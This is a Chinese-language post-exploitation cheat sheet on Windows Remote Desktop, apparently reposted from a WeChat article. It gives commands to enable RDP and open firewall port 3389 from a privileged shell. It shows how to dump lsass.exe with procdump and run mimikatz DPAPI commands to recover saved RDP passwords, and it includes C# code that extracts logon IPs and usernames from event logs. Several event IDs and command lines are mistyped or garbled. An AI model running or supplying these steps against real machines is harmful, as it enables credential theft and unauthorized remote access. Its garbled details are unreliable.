# Remote desktop

---

来源:https://mp.weixin.qq.com/s/pHtFF72WRDqwtu_fI1cXuQ

​       远程桌面默认为3389端口,进程名为TermService,本地可以通过mstsc命令来开启远程桌面登陆界面

```
tasklist /svc | findstr TermService
```

**查看远程桌面开启端口**

```
tasklist /svc | findstr TermService 
	svchost.exe    进程号pid  TermService
netstat -ano | findstr "前面获取到的pid"
	显示0.0.0.0:端口号
	
或者-----------------------------
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber
	回显如:0xd3d
打开calc,设置程序员的计算器,输入0xd3d,显示DEC的那栏就是端口号
```

**高权限的shell能通过命令开启**

- 允许3389放行(防火墙放行)

  ```
netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in localport=3389 action=allow
  ```

- 通用开3389

  ```
  wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
  ```
- For Win2003
  ```
  REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
  ```
- For Win2008
  ```
  REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
  ```
- For Every: cmd开3389 win08 win03 win7 win2012 winxp win08，三条命令即可:
  ```
   wmic /namespace:\root\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
  wmic /namespace:\root\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1
  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser
  ```

- 或者使用PS脚本

  https://github.com/QAX-A-Team/EventLogMaster/blob/master/powershell/RegfDenyTSConnections.ps1
  Powershell 命令:

  ```
  Import-MOdule .\RegfDenyTSConnections.ps1
  RegfDenyTSConnections 1 # 关闭3389
  RegfDenyTSConnections 0 # 开启3389
  ```

  可以通过命令查看是否开启:netstat -ano | findstr "3389" 

**Mstsc保存密码进行解密**

- 查看保存的凭证

  ```
  cmdkey /l   # 查看保存的凭证
  dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*      # 查看凭证保存的文件
  回显文件名:xxxxxxxxxx
  ```

- 获取内存文件
  procdump下载：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump

  ```
  procdump64.exe -accepteula -ma lsass.exe lsass.dmp
  ```

- mimikatz获取内存文件中的密码
  
  mimikatz下载：https://github.com/gentilkiwi/mimikatz/releases
  ```
  mimikatz.exe "dpapi::cred /in:C:\Users\jack\AppData\Local\Microsoft\Credentials\xxxxxxxxxx" "exit" > 1.txt
  获取到guidMasterKey :{xxxxx-xxxxxx-xxxx-xxxxxx}
  ```
  获取MasterKey:
  ```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::dpapi" "exit" > 2.txt
  回显获取到MasterKey
  ```
  使用MasterKey进行解密
  ```
  mimikatz.exe "dpapi::cred /in:C:\Users\jack\AppData\Local\Microsoft\Credentials\xxxxxxxxxxx /masterkey:MasterKey" "exit" > 3.txt
  CreadentialBlob:密码
  ```



**远程桌面日志溯源**

​	在windows日志事件里id为4624(成功登录)和4635(失败登录)

通过编译以下文件来获取登陆成功日志:EvnetLog.exe -4634

```
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
namespace SharpEventLog
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                System.Console.WriteLine("Usage: EventLog.exe -4624");
                System.Console.WriteLine("       EventLog.exe -4625");
            }
            if (args.Length == 1 && args[0] == "-4624")
            {
                EventLog_4624();
            }
            if (args.Length == 1 && args[0] == "-4625")
            {
                EventLog_4625();
            }
            
        }
        public static void EventLog_4624()
        {
            EventLog log = new EventLog("security");
            Console.WriteLine("\r\n========== 4624 ==========\r\n");
            var entries = log.Entries.Cast<EventLogEntry>().Where(x => x.InstanceId == 4624);
            entries.Select(x => new
            {
                x.MachineName,
                x.Site,
                x.Source,
                x.Message,
                x.TimeGenerated
            }).ToList();
            foreach (EventLogEntry log1 in entries)
            {
                string text = log1.Message;
                string ipaddress = MidStrEx(text, "    源网络地址:    ", "    源端口:");
                string username = MidStrEx(text, "新登录:", "进程信息:");
                username = MidStrEx(username, "    帐户名:        ", "    帐户域:        ");
                DateTime Time = log1.TimeGenerated;
                if (ipaddress.Length >= 7)
                {
                    Console.WriteLine("\r\n-----------------------------------");
                    Console.WriteLine("Time: " + Time);
                    Console.WriteLine("Status: True");
                    Console.WriteLine("Username: " + username.Replace("\n", "").Replace(" ", "").Replace("\t", "").Replace("\r", ""));
                    Console.WriteLine("Remote ip: " + ipaddress.Replace("\n", "").Replace(" ", "").Replace("\t", "").Replace("\r", ""));
                }
            }
        }
        public static void EventLog_4625()
        {
            EventLog log = new EventLog("Security");
            Console.WriteLine("\r\n========== 4625 ==========\r\n");
            var entries = log.Entries.Cast<EventLogEntry>().Where(x => x.InstanceId == 4625);
            entries.Select(x => new
            {
                x.MachineName,
                x.Site,
                x.Source,
                x.Message,
                x.TimeGenerated
            }).ToList();
            foreach (EventLogEntry log1 in entries)
            {
                string text = log1.Message;
                string ipaddress = MidStrEx(text, "    源网络地址:    ", "    源端口:");
                string username = MidStrEx(text, "新登录:", "进程信息:");
                username = MidStrEx(username, "    帐户名:        ", "    帐户域:        ");
                DateTime Time = log1.TimeGenerated;
                if (ipaddress.Length >= 7)
                {
                    Console.WriteLine("\r\n-----------------------------------");
                    Console.WriteLine("Time: " + Time);
                    Console.WriteLine("Status: Flase");
                    Console.WriteLine("Username: " + username.Replace("\n", "").Replace(" ", "").Replace("\t", "").Replace("\r", ""));
                    Console.WriteLine("Remote ip: " + ipaddress.Replace("\n", "").Replace(" ", "").Replace("\t", "").Replace("\r", ""));
                }
            }
        }
        public static string MidStrEx(string sourse, string startstr, string endstr)
        {
            string result = string.Empty;
            int startindex, endindex;
            startindex = sourse.IndexOf(startstr);
            if (startindex == -1)
                return result;
            string tmpstr = sourse.Substring(startindex + startstr.Length);
            endindex = tmpstr.IndexOf(endstr);
            if (endindex == -1)
                return result;
            result = tmpstr.Remove(endindex);
            return result;
        }
    }
}
```

